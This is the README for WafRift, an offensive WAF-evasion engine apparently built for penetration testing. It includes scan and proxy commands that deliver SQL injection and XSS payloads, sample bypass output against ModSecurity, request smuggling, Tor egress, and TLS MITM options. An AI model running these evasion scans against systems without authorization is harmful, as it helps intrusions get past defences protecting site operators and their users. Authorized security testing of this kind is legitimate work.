# WafRift

[![CI](https://github.com/santht/wafrift/actions/workflows/ci.yml/badge.svg)](https://github.com/santht/wafrift/actions/workflows/ci.yml)
[![License: MIT OR Apache-2.0](https://img.shields.io/badge/License-MIT%20OR%20Apache--2.0-blue.svg)](#license)
[![Crates.io](https://img.shields.io/crates/v/wafrift)](https://crates.io/crates/wafrift)

> Part of the [Santh](https://santh.dev) security research ecosystem.

**A programmable WAF-evasion engine with per-technique controls — and an evolutionary mode that learns bypasses for you.**

Other tools give you one trick: junk padding, header injection, smuggling, or a static tamper list. WafRift is the union — encoding, grammar-aware mutation, content-type switching, request smuggling, and TLS/HTTP fingerprint rotation. In v0.1 the **CLI exposes encoding strategies and the grammar layer as fine-grained `--only`/`--exclude` selectors**; the rest run as part of the default pipeline. Per-host toggle persistence and a Burp Suite control panel are tracked in the [post-0.1 roadmap](docs/GAP_CLOSURE_ROADMAP.md). Turn the engine loose and a search loop (hill-climb / SA / tabu / novelty / MAP-Elites) discovers what bypasses the target WAF and persists winning pipelines to a per-WAF **gene bank** so the next scan starts with zero discovery phase.

```
$ wafrift scan --target http://target.com --payload "' OR 1=1--" --level heavy

╔══════════════════════════════════════════════════╗
║  WafRift Live WAF Evasion Scanner
╚══════════════════════════════════════════════════╝

  Target: http://target.com
  Payload Type: SQL Injection
  Variants: 941

[1/7] Detecting WAF...
  ✓ Detected: ModSecurity CRS (88% confidence)
  📋 Advisor: Use heavy encoding + keyword-free mutations

[2/7] Testing baseline (raw payload)...
  ✓ Raw payload BLOCKED — WAF is active (HTTP 403)

[3/7] Exploring evasion variants...
  ....!!..!..!!.....!!.....!!.....!!.....!!

[4/7] Exploiting winning strategies...
  → encoding chaining  → cross-pollination  → fresh mutations

[5/7] Multi-vector delivery (header, HPP, multipart)...
[6/7] Header obfuscation probing...
[7/7] Intelligence loop (50 evolution rounds)...

══════════════════════════════════════════════════
  WAF: ModSecurity CRS   Bypass Rate: 77.9%
  Blocked: 178            Bypassed: 764
══════════════════════════════════════════════════

🧬 Gene bank updated: 12 techniques saved for ModSecurity CRS
```

## Why WafRift?

**Composable, not monolithic.** Encoding strategies and the grammar layer are addressable as hierarchical paths and individually selectable: `--only encoding/url` runs a surgical pipeline; `--exclude encoding/url/triple,grammar` keeps the loud transforms off; default = full pipeline. Run `wafrift techniques list` to see every selector. No other open-source bypass tool exposes this surface — Burp's `nowafpls` does junk padding, `Bypass WAF` does headers, `HTTP Smuggler` does smuggling. WafRift is the union, on knobs.

**Evolutionary, not static.** Most bypass tools apply the same transforms every time. WafRift:

1. **Discovers** which evasion techniques bypass the target WAF
2. **Prunes** techniques that get blocked
3. **Rotates** only proven winners to avoid pattern detection
4. **Adapts** — if the WAF learns to block a winner, WafRift detects the drift and rediscovers

The gene bank (`~/.wafrift/genomes/`) persists learned bypasses across sessions. Scan a Cloudflare site once, and every future Cloudflare scan starts with proven bypasses — **zero discovery phase**.

**Semantically correct.** Grammar mutations are validated against `sqlparser-rs` AST equivalence, so SQL variants actually parse — most tampers ship broken payloads and don't know it.

## Installation

```bash
cargo install --path crates/cli
```

## Usage

### Interactive Mode (default)

```bash
wafrift
```

Launches a terminal UI with menu navigation, gene bank browser, and guided command hints.

### Scan a Target

```bash
# Basic scan
wafrift scan --target http://target.com --payload "' OR 1=1--"

# XSS scan with heavy evasion
wafrift scan --target http://target.com --payload "<script>alert(1)</script>" --level heavy

# JSON output for CI/CD
wafrift scan --target http://target.com --payload "' OR 1=1--" --format json

# JSON with fixed “layer” matrix (network / detection / baseline / evasion)
wafrift scan --target http://target.com --payload "' OR 1=1--" --format json --report-layers

# Egress preset (Tor SOCKS JSON for EvasionConfig)
wafrift egress-example --preset tor

# Custom parameter name
wafrift scan --target http://target.com --payload "' UNION SELECT 1--" --param id
```

### Transform Payloads (offline)

```bash
# Light evasion
wafrift evade --payload "' OR 1=1--" --level light

# Heavy evasion with all techniques
wafrift evade --payload "' OR 1=1--" --level heavy
```

### Fine-Grained Technique Selection

Every encoding strategy and the grammar layer are addressable as hierarchical paths.
List what's available, then include or exclude per scan:

```bash
# See the full tree
wafrift techniques list

# Only URL-family encodings (no grammar, no Unicode, no entities)
wafrift evade --payload "' OR 1=1--" --only encoding/url

# Everything except triple-URL and SQL-comment tampers
wafrift scan --target http://target.com --payload "' OR 1=1--" \
  --exclude encoding/url/triple,encoding/sql/comment

# Compose: only URL family, but skip the noisiest variant
wafrift evade --payload "' OR 1=1--" \
  --only encoding/url --exclude encoding/url/triple
```

Unknown selectors fail fast — no silent drops.

### Detect a WAF

```bash
wafrift detect --status 403 --headers "server: cloudflare" --body "Attention Required!"
```

### Proxy Mode

```bash
# Start evasion proxy on port 8080
wafrift-proxy --listen 127.0.0.1:8080

# Force heavy-level evasion
wafrift-proxy --listen 127.0.0.1:8080 --escalation heavy

# HTTPS MITM (install generated CA in the client first — see docs/PROXY_TOOLING.md)
wafrift-proxy --write-mitm-ca-dir ./mitm-ca
wafrift-proxy --listen 127.0.0.1:8080 --mitm --mitm-ca-dir ./mitm-ca
```

Point your scanner at the proxy — all traffic is automatically transformed to bypass WAF rules. The proxy learns per-host: discovery → rotation → drift detection → re-discovery. With **`--mitm`**, TLS on `CONNECT` is terminated so HTTPS requests go through the same evasion path (authorized targets only).

## Architecture

```
wafrift
├── crates/
│   ├── types          # Core types: Request, Technique, EvasionResult
│   ├── encoding       # 15+ encoding strategies (URL, Unicode, HTML entity, chunked, etc.)
│   ├── grammar        # Grammar-aware payload mutations (SQLi, XSS, CMD, SSTI, SSRF, LDAPi, path traversal)
│   ├── content-type   # Content-Type switching (JSON, XML, multipart, etc.)
│   ├── smuggling      # HTTP request smuggling (CL.TE, TE.CL, H2)
│   ├── fingerprint    # Browser fingerprint rotation (User-Agent, TLS, headers)
│   ├── detect         # WAF fingerprinting (160+ WAFs via TOML rules)
│   ├── evolution      # Genetic algorithm: crossover, mutation, fitness, MCTS, differential probing
│   ├── oracle         # Multi-signal response classification (block / bypass / challenge / rate-limit)
│   ├── strategy       # Pipeline orchestrator + gene bank + learning cache + adaptive host state
│   ├── transport      # Evasion-aware HTTP client with auto-retry
│   ├── proxy          # HTTP forward proxy with per-host adaptive evasion
│   ├── pool           # Proxy pool rotation (round-robin HTTP/SOCKS5)
│   ├── recon          # Origin discovery via OSINT (CT logs, DNS history)
│   └── cli            # Interactive TUI + headless scan/evade/detect/probe commands
```

## As a Library

Import the façade crate for all modules under one dependency, or pull individual crates (see below).

```toml
[dependencies]
wafrift-core = "0.1"
tokio = { version = "1", features = ["rt-multi-thread", "macros"] }
```

```rust
use wafrift_core::encoding::{self, Strategy};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let encoded = encoding::encode(b"' OR 1=1--", Strategy::UnicodeEncode)?;
    println!("{encoded}");
    Ok(())
}
```

The CLI’s live `scan` flow is built from `wafrift-strategy`, `wafrift-transport`, and `wafrift-detect`; embed those crates directly if you need the same pipeline without the binary.

## As Individual Crates

Use exactly the piece you need — no full-engine import required.

```toml
[dependencies]
wafrift-encoding = "0.1"    # 15+ encoding strategies
wafrift-grammar = "0.1"     # SQL/XSS/CMD/SSTI dialect mutations
wafrift-detect = "0.1"      # WAF fingerprinting (160+ WAFs via TOML rules)
wafrift-smuggling = "0.1"   # HTTP request smuggling probes
wafrift-evolution = "0.1"   # Genetic/novelty/MAP-Elites bypass search
wafrift-oracle = "0.1"      # Response verdict classification
wafrift-strategy = "0.1"    # Per-WAF evasion pipeline planning
```

```rust
use wafrift_encoding::{Strategy, encode};

let encoded = encode(b"' OR 1=1--", Strategy::UnicodeEscape)?;
```

## Community Rules (Tier B)

WAF signatures, evasion pipelines, and smuggling probes live as TOML files in `rules/`. Adding a new WAF = 5 lines of TOML, no Rust knowledge:

```toml
# rules/detect/mywaf.toml
name = "MyWAF"
vendor = "Example Corp"
confidence_weight = 0.9

[[headers]]
name = "Server"
pattern = "MyWAF/\\d+"

[[body_patterns]]
pattern = "(?i)blocked by MyWAF"

evasions = ["encoding::unicode", "grammar::tautology_swap"]
```

Drop into `rules/detect/` and the detector loads it at startup.

## Gene Bank

WafRift remembers what works. After every scan, learned techniques are persisted to `~/.wafrift/genomes/<waf_name>.json`:

```json
{
  "waf_name": "Cloudflare",
  "techniques": [
    { "name": "encoding::UnicodeEncode", "total_successes": 13, "total_attempts": 13 },
    { "name": "encoding::HtmlEntityEncode", "total_successes": 13, "total_attempts": 13 },
    { "name": "tautology_swap", "total_successes": 56, "total_attempts": 56 }
  ],
  "targets_scanned": 3
}
```

Next time you scan a Cloudflare site, these techniques load automatically.

## Proxy Feedback Loop

The proxy continuously learns:

```
Request → evade() → forward → observe 200/403
                ↑                       |
                └── feedback loop ──────┘

Discovery → Rotation → Drift Detection → Re-Discovery
```

- **Discovery**: try all techniques, track success/failure rates
- **Rotation**: once ≥60% winners found, only use those (round-robin)
- **Drift**: if a winner gets blocked 2× consecutively, evict it
- **Re-discovery**: if all winners evicted, clean slate and restart

## Evasion Techniques

| Category | Techniques |
|----------|-----------|
| **Encoding** | URL, Double-URL, Triple-URL, Unicode, IIS Unicode, HTML entity, Hex, Base64, UTF-7, Overlong UTF-8, Chunked split, Parameter pollution, Null byte |
| **Grammar** | Tautology swap, keyword-free arithmetic, comment insertion, whitespace variation, keyword casing, string splitting, hex literals, dialect-specific (MySQL/PG/MSSQL/Oracle/SQLite) |
| **Content-Type** | JSON body, XML body, multipart form-data switching |
| **Headers** | Case mixing, header injection, duplicate headers, HPP |
| **Fingerprint** | User-Agent rotation, TLS fingerprint, Accept-Language |
| **Smuggling** | CL.TE, TE.CL, HTTP/2 mixed-case headers, H2 pseudo-header abuse |

## Parity roadmap (proxy, TLS, origin, egress)

See [docs/GAP_CLOSURE_ROADMAP.md](docs/GAP_CLOSURE_ROADMAP.md) for phased work toward EvilWAF-class workflows (HTTPS MITM, JA3 parity, recon). Supporting docs: [docs/PROXY_TOOLING.md](docs/PROXY_TOOLING.md), [docs/TLS_PARITY.md](docs/TLS_PARITY.md).

## License

Licensed under either of

- Apache License, Version 2.0 ([LICENSE-APACHE](LICENSE-APACHE) or <http://www.apache.org/licenses/LICENSE-2.0>)
- MIT license ([LICENSE-MIT](LICENSE-MIT) or <https://opensource.org/licenses/MIT>)

at your option.

### Contribution

Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in the work by you, as defined in the Apache-2.0 license, shall be dual licensed as above, without any additional terms or conditions.
